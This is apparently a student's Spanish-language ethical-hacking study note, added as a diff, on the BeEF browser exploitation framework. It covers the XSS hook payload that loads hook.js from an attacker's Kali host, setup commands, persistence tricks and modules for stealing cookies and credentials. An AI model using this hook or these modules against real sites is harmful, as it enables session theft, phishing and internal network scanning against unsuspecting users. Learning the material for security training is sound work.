@@ -1,0 +1,130 @@
+====================================================
+  BeEF - Browser Exploitation Framework
+  Apuntes XSS Avanzado | Ethical Hacking
+  D1n0 | U-TAD 2025-2026
+====================================================
+
+[Ver XSS-Guia.txt para tipos de XSS, payloads y evasion de filtros]
+
+¿QUE ES BEEF?
+-------------
+Framework de post-explotacion que usa XSS como vector de entrada.
+Una vez que la victima carga el payload, su navegador queda "hookeado"
+y aparece en el panel de control del atacante.
+
+No es acceso al sistema — es acceso al navegador como plataforma.
+
+
+PREREQUISITO: TENER XSS
+------------------------
+BeEF necesita que ya tengas un punto de inyeccion XSS funcionando.
+El payload de entrada es siempre:
+
+  <script src="http://[KALI_IP]:3000/hook.js"></script>
+
+Para que la victima lo ejecute necesitas:
+  XSS Almacenado --> inyectas el payload en un campo que se guarda
+                     en BD. Cualquier visitante queda hookeado solo
+                     con visitar la pagina. El mas valioso.
+  XSS Reflejado  --> crafteas una URL con el payload. La victima
+                     debe hacer clic en esa URL. Hook puntual.
+
+
+FLUJO BASICO
+------------
+1. Arranca BeEF en Kali:
+     sudo beef-xss
+   Panel en: http://127.0.0.1:3000/ui/panel
+   Usuario/pass: beef / (el que hayas puesto en config.yaml)
+
+2. Victima carga una pagina con el XSS inyectado:
+     <script src="http://[KALI_IP]:3000/hook.js"></script>
+
+3. El navegador de la victima aparece en "Hooked Browsers"
+   (panel izquierdo, icono verde = activo)
+
+4. Selecciona el navegador hookeado --> pestana Commands
+   --> elige modulo --> Execute
+
+
+INSTALACION (Kali)
+------------------
+  sudo apt install beef-xss -y
+  sudo nano /etc/beef-xss/config.yaml   <- cambiar contrasena
+  sudo beef-xss
+
+
+LO QUE PERMITE HACER
+--------------------
+- Robar cookies (sin HttpOnly)
+- Keylogging en la pagina activa
+- Leer el DOM / contenido de pagina
+- Redirigir al usuario
+- Ingenieria social (popups, phishing overlay)
+- Escanear puertos de la red interna (desde el browser victima)
+- Fingerprinting: OS, plugins, IPs internas
+- Explotar vulnerabilidades del propio navegador (CVEs)
+
+
+LIMITACIONES (sandbox del navegador)
+--------------------------------------
+- NO puede leer cookies con flag HttpOnly
+- NO puede acceder a otros dominios (Same-Origin Policy)
+- NO accede directamente al sistema de ficheros
+- NO persiste si se cierra... salvo con tecnicas de persistencia
+
+
+PERSISTENCIA
+------------
+BeEF crea inicialmente un hook vinculado a la pagina donde se
+inyecto el XSS. Ese hook es el punto de entrada, pero no el fin.
+
+Una vez establecido el hook, se puede activar persistencia.
+A partir de ese momento:
+  --> Ya no hace falta que la pagina con el XSS siga abierta
+  --> El hook sobrevive mientras el navegador este abierto
+  --> Se puede pivotar entre paginas con el hook activo
+
+Mecanismos principales:
+  Iframe/ventana invisible  --> mantiene hook.js cargado en 2o plano
+  Pop-under                 --> ventana oculta detras del navegador
+  Man-In-The-Browser (MITB) --> intercepta navegacion en el dominio
+
+Con persistencia activa:
+  --> Da igual a que pagina vaya el usuario, el atacante "va con el"
+  --> Se pueden capturar credenciales de cualquier formulario
+  --> El navegador actua como implante (similar a troyano, en browser)
+
+
+MODULOS UTILES (panel Commands)
+--------------------------------
+  Get Cookie              --> roba cookies de sesion accesibles
+  Get Page HTML           --> captura el DOM completo
+  Port Scanner            --> escanea red interna desde el browser
+  Alert Dialog            --> popup falso (ingenieria social)
+  Fingerprint Network     --> detecta IPs y servicios internos
+  Pretty Theft            --> overlay de login falso para credenciales
+  Redirect Browser        --> redirige la victima a una URL
+
+
+RELACION XSS <--> BEEF
+-----------------------
+  XSS Reflejado  --> hook puntual, victima debe cargar la URL trampa
+  XSS Almacenado --> hook automatico cada vez que alguien visita
+                     la pagina. Mucho mas valioso para persistencia.
+
+LIMITACION IMPORTANTE:
+  El salto al sistema operativo desde BeEF requeriria explotar
+  una vulnerabilidad del propio navegador o del SO.
+  BeEF por si solo no da acceso al sistema, solo al navegador.
+
+
+CONCEPTO CLAVE
+--------------
+BeEF convierte el XSS de "puedo mostrar un alert()" a
+"tengo el navegador de la victima como herramienta de ataque
+persistente contra el propio usuario y su red interna".
+
+====================================================
+  Ref: PentesterLab Web for Pentesters + curso U-TAD
+====================================================
